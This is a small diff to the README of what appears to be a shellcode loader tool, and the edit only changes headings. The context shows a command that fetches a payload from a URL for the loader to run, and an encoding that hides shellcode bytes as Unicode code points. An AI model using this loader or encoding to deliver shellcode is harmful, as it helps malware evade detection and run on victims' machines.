@@ -56,10 +56,11 @@ kemet_loader.exe output.txt
 ```bash
 kemet_http_loader.exe https://example.com/payload.txt
 ```
-##📘 How It Works
+----
+
+## 📘 How It Works
 Encoding
 Each shellcode byte is transformed into a Unicode code point:
-
 ```ini
 encoded = 0x13000 + byte_value
 ```
